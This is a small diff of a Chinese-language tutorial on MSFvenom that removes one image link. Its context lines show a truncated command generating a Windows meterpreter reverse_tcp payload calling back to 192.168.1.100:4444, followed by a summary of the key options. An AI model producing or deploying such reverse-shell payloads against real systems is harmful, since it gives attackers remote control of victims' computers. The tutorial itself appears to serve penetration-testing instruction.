@@ -101,7 +101,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -a x8
 
 简单回顾，MSFvenom的关键在于正确指定**Payload类型（`-p`）**、**输出格式（`-f`）**、**连接地址和端口（LHOST, LPORT）**，并在监听端保持配置一致。
 
-![](img/e649366d4c772d54619976f826025e98_1.png)
 
 ![](img/e649366d4c772d54619976f826025e98_2.png)
 
